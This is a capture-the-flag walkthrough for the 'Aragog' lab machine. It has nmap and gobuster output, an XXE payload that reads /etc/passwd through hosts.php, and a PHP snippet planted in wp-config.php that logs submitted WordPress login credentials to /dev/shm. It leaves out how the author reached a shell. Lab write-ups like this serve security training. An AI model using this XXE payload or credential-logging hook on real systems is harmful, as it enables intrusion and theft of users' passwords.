# Aragog Writeup


## Enumeration

#### Port Scanning

```
Nmap scan report for 10.129.220.248
Host is up (0.13s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.131
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh
| ssh-hostkey: 
|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)
|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)
|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (ED25519)
80/tcp open  http
|_http-title: Apache2 Ubuntu Default Page: It works

```

#### Directory Fuzzing

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.220.248/
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,aspx,sh,php,html
[+] Timeout:                 10s
===============================================================
2021/11/23 06:12:48 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11321]
/hosts.php            (Status: 200) [Size: 46]   
```

## Initial Access
Navigating to the [hosts.php](http://10.129.220.248/hosts.php), the page dumps a host count. 

Going back to FTP, we can log in as Anonymous, and we see a _test.txt_ file that contains what seems like an XML payload that would be sent to the _hosts.php_ endpoint via a POST request. 

Testing this, we're right. I used [this cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md) to create this payload:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE details [
<!ELEMENT subnet_mask ANY >
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<details>
<subnet_mask>&file;</subnet_mask>
<test></test>
</details>
```

This succeeds by dumping the contents of /etc/passwd, where I found 2 users, **cliff** and **florian**. 


## Privelege Escalation

Saw that there was a process called `whoopsie` running constantly that simulated an administrator loggin into Wordpress. Added these lines to _wp-config.php_ to output the credentials entered into the form. 


```
$rrr = print_r($_REQUEST, true);
$fff = fopen("/dev/shm/df", "a");
fwrite($fff, $rrr);
fclose($fff);
```
Got root password and flag.
